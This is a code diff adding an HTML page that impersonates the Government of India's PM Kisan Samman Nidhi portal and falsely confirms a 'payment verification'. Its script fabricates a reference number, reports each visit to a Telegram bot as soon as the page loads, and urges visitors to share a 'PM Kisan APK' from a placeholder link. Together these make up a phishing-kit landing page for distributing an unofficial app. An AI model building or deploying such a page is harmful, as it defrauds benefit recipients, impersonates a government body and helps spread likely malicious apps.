@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification Successful</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Success Container */
+        .success-container {
+            background: linear-gradient(135deg, #ffffff, #f0f4f7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        .success-container h1 {
+            color: #1565c0;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+
+        .success-container p {
+            font-size: 1.2rem;
+            color: #333;
+            margin: 10px 0;
+        }
+
+        .details {
+            text-align: left;
+            margin-top: 20px;
+        }
+
+        .details p {
+            font-size: 1rem;
+            color: #555;
+        }
+
+        .highlight {
+            font-weight: bold;
+            color: #1565c0;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: black;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* APK Share Button */
+        .apk-share-button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .apk-share-button:hover {
+            background-color: #45a049;
+        }
+
+        /* Rating Button */
+        .rating-button {
+            background-color: #FFA500;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .rating-button:hover {
+            background-color: #FF8C00;
+        }
+
+        /* Date Display */
+        .date-display {
+            font-size: 0.9rem;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        /* Rating Popup */
+        .rating-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+        }
+
+        .rating-popup h3 {
+            margin: 0 0 10px;
+            font-size: 1.2rem;
+        }
+
+        .rating-popup button {
+            background-color: #1565c0;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .rating-popup button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Thank You Popup */
+        .thank-you-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .thank-you-popup h3 {
+            margin: 0 0 10px;
+            font-size: 1.5rem;
+            color: #4CAF50;
+        }
+
+        .thank-you-popup p {
+            font-size: 1rem;
+            color: #333;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translate(-50%, -60%); }
+            100% { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        /* Overlay */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .success-container {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Success Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="success-container">
+            <h1>🎉 Your Payment Verification is Successful! 🎉</h1>
+            <p>Thank you for completing the payment verification process. Below are your details:</p>
+
+            <div class="details">
+                <p><span class="highlight">Reference Number:</span> <span id="refNumber"></span></p>
+                <p><span class="highlight">Date:</span> <span id="currentDate"></span></p>
+            </div>
+        </div>
+    </main>
+
+    <!-- APK Share Button and Date -->
+    <div style="text-align: center; margin-top: 20px;">
+        <button class="apk-share-button" onclick="shareAPK()">Share APK</button>
+        <button class="rating-button" onclick="openRatingPopup()">Rate Us</button>
+    </div>
+
+    <!-- Rating Popup -->
+    <div class="overlay" id="overlay"></div>
+    <div class="rating-popup" id="ratingPopup">
+        <h3>Rate Your Experience</h3>
+        <p>How would you rate our service?</p>
+        <button onclick="submitRating(5)">⭐️⭐️⭐️⭐️⭐️</button>
+        <button onclick="submitRating(4)">⭐️⭐️⭐️⭐️</button>
+        <button onclick="submitRating(3)">⭐️⭐️⭐️</button>
+        <button onclick="submitRating(2)">⭐️⭐️</button>
+        <button onclick="submitRating(1)">⭐️</button>
+        <button onclick="closeRatingPopup()">Close</button>
+    </div>
+
+    <!-- Thank You Popup -->
+    <div class="thank-you-popup" id="thankYouPopup">
+        <h3>Thank You! 🙏</h3>
+        <p>We appreciate your feedback!</p>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Function to generate a random 20-digit reference number
+        function generateRefNumber() {
+            let refNumber = '';
+            for (let i = 0; i < 20; i++) {
+                refNumber += Math.floor(Math.random() * 10);
+            }
+            return refNumber;
+        }
+
+        // Display reference number and current date
+        const refNumber = generateRefNumber();
+        const currentDate = new Date().toLocaleDateString('en-GB');
+        document.getElementById('refNumber').textContent = refNumber;
+        document.getElementById('currentDate').textContent = currentDate;
+
+        // Function to send data to Telegram bot
+        function sendToTelegram(message) {
+            const botToken = 'YOUR_BOT_API_TOKEN'; // Replace with your bot token
+            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Data sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending data to Telegram:', error);
+                });
+        }
+
+        // Send reference number and date to Telegram bot
+        const message = `Payment Verification Successful!\nReference Number: ${refNumber}\nDate: ${currentDate}`;
+        sendToTelegram(message);
+
+        // Function to share the APK
+        function shareAPK() {
+            const apkUrl = 'https://example.com/pm-kisan.apk'; // Replace with your APK URL
+            if (navigator.share) {
+                navigator.share({
+                    title: 'PM Kisan Samman Nidhi APK',
+                    text: 'Download the PM Kisan Samman Nidhi APK now!',
+                    url: apkUrl,
+                })
+                .then(() => console.log('APK shared successfully'))
+                .catch((error) => console.error('Error sharing APK:', error));
+            } else {
+                alert('Sharing is not supported in your browser. Please download the APK manually.');
+            }
+        }
+
+        // Function to open the rating popup
+        function openRatingPopup() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('ratingPopup').style.display = 'block';
+        }
+
+        // Function to close the rating popup
+        function closeRatingPopup() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('ratingPopup').style.display = 'none';
+        }
+
+        // Function to submit rating
+        function submitRating(rating) {
+            closeRatingPopup();
+            document.getElementById('thankYouPopup').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('thankYouPopup').style.display = 'none';
+            }, 3000); // Hide the thank-you popup after 3 seconds
+        }
+    </script>
+</body>
+</html>
